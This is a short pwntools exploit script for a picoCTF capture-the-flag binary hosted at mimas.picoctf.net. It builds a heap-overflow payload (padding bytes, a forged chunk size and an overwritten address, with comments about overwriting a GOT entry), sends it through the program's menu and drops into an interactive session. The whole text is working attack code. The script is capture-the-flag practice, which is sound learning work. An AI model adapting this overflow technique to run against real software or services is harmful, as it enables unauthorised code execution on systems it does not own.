# # Optional: interact or receive output
# p.interactive()


from pwn import *

context.binary = './chall'

p = remote("mimas.picoctf.net", 64901)

########## Using malloc to overwrite GOT entry ##########

# payload1 = b'A'*28 + b'\x21' + b'\x00'*3 + b'\x74' + b'\x32' + b'\x05' + b'\x08'
#  b'\x0c\x32\x04\x08' 
payload1 = '2'

payload2 = b'A'*24 + b'\x21\x00\x00\x00\x00\x00\x00\x00'
payload2 = payload2 + p64(0x4011a0)
payload3 = '4'


DEBUG = False  # ‚Üê toggle this as needed

if DEBUG:
    p = gdb.debug(context.binary.path, gdbscript='''
        b main
        continue
    ''')
else:
    p = remote("mimas.picoctf.net", 64901)
    
# 0x804321d

p.sendlineafter("Enter your choice:", payload1)
p.sendline(payload2)
p.sendlineafter("Enter your choice:", payload3)
p.interactive()